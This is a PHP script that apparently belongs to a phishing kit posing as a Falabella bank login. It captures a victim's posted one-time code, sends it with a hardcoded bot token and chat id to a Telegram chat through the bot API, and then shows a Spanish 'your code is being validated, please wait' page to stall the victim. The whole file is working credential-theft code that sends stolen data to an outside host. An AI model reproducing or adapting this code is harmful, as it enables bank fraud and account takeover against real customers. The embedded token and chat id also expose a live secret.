<?php



session_start();

$_SESSION['user'] = "hola";

$cDinamica = $_POST['inp-otp'];

//echo "El codigo es:".$codigo;

//$res = preg_replace('/[\@\.\;\-" "]+/', '', $fecha);

$string = "Falabella Login:\nCedula: \nClave: ".$cDinamica;
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
date_default_timezone_set('America/Guatemala');

$token = "6009842885:AAG3M8tUtIKVv6s_Dsz5tI_MbTuz80McYzo";
    
$datos = [
    'chat_id' => '-778349780',
    #'chat_id' => '@el_canal si va dirigido a un canal',
    'text' => $string,
    'parse_mode' => 'MarkdownV2' #formato del mensaje
];
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $token . "/sendMessage");
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, $datos);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$r_array = json_decode(curl_exec($ch), true);

curl_close($ch);
 

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>

    <style>
        *{
            font-family: Arial, Helvetica, sans-serif;
                }
    </style>
</head>
<body>

   
   <center> <br><br>
   <a>Tu Dinamica se esta validando , espere un momento por favor.</a></center>

    
</body>
</html>